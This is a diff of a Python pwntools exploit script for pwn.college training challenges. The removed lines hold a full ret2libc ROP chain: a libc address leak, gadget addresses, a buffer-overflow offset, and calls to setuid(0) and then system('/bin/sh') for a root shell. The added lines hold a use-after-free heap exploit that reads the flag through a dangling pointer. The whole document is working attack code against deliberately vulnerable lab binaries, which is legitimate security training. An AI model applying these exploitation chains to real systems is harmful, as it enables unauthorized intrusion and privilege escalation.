@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
-# pwn.college/program-security/return-oriented-programming/
-# Challenge: leveraging-libc-hard
+# pwn.college/program-security/dynamic-allocator-misuse/
+# Challenge: freebie-hard
+# Exploit: Use-After-Free to read flag
 
 from pwn import *
 
@@ -8,65 +9,39 @@ from pwn import *
 context.arch = "amd64"
 
 # Start the challenge process
-io = process("/challenge/leveraging-libc-hard")
+io = process("/challenge/freebie-hard")
 
-# Receive the leaked system address
-io.recvuntil(b'The address of "system" in libc is: ')
-leak = io.recvline().strip().decode()
-# Remove the trailing period if present
-leak = leak.rstrip(".")
-system_addr = int(leak, 16)
-log.info(f"Leaked system address: {hex(system_addr)}")
+# Receive welcome messages
+io.recvuntil(b"quit): ")
 
-# Calculate libc base address
-# We need to find the offset of system in libc
-# For typical libc, we can calculate the offset to "/bin/sh" string
-# Common offsets (may need adjustment based on libc version):
-# system offset in libc is usually around 0x50d60 or similar
-# /bin/sh offset in libc is usually around 0x1d8698 or similar
+# Step 1: Allocate a chunk that matches the read_flag allocation size (0x3de = 990 bytes)
+# The heap allocator will round this up, but we want something close
+log.info("Step 1: Allocating memory chunk (size 990)")
+io.sendline(b"malloc")
+io.recvuntil(b"Size: ")
+io.sendline(b"990")
+io.recvuntil(b"quit): ")
 
-# We'll use a common technique: calculate libc base from system
-# Then find /bin/sh string in libc
-libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
-libc.address = system_addr - libc.symbols["system"]
-log.info(f"Libc base address: {hex(libc.address)}")
+# Step 2: Free the chunk - creates a dangling pointer
+log.info("Step 2: Freeing the chunk (creating dangling pointer)")
+io.sendline(b"free")
+io.recvuntil(b"quit): ")
 
-# Find /bin/sh string in libc
-binsh_addr = next(libc.search(b"/bin/sh"))
-log.info(f"/bin/sh address: {hex(binsh_addr)}")
+# Step 3: Trigger read_flag - this will allocate 0x3de bytes and read flag into it
+# The allocator may reuse our freed chunk!
+log.info("Step 3: Triggering read_flag (reuses freed memory)")
+io.sendline(b"read_flag")
+io.recvuntil(b"quit): ")
 
-# Get setuid address from libc
-setuid_addr = libc.symbols["setuid"]
-log.info(f"setuid address: {hex(setuid_addr)}")
-
-# ROP gadgets from the binary
-pop_rdi = 0x4013F3  # pop rdi; ret
-ret = 0x40101A  # ret (for stack alignment)
-
-# Calculate buffer overflow offset
-# From the disassembly: buffer is at -0x90(%rbp)
-# Stack layout: buffer (0x90 bytes) + saved rbp (8 bytes) + return address (8 bytes)
-offset = 0x90 + 8
-
-# Build the payload
-payload = b"A" * offset
-
-# ROP chain to call setuid(0) then system("/bin/sh")
-# First call setuid(0) to maintain root privileges
-payload += p64(pop_rdi)  # pop rdi; ret
-payload += p64(0)  # uid = 0 (root)
-payload += p64(ret)  # Stack alignment for setuid
-payload += p64(setuid_addr)  # setuid(0)
-
-# Then call system("/bin/sh")
-payload += p64(pop_rdi)  # pop rdi; ret
-payload += p64(binsh_addr)  # "/bin/sh" address
-payload += p64(ret)  # Stack alignment for system
-payload += p64(system_addr)  # system("/bin/sh")
-
-# Send the payload
-log.info(f"Sending payload of length {len(payload)}")
-io.send(payload)
+# Step 4: Use puts with the dangling pointer to read the flag
+log.info("Step 4: Reading flag via use-after-free")
+io.sendline(b"puts")
+io.recvuntil(b"Data: ")
 
 # Get the flag
-io.interactive()
+flag = io.recvline()
+log.success(f"Flag: {flag.decode().strip()}")
+
+# Clean exit
+io.sendline(b"quit")
+io.close()
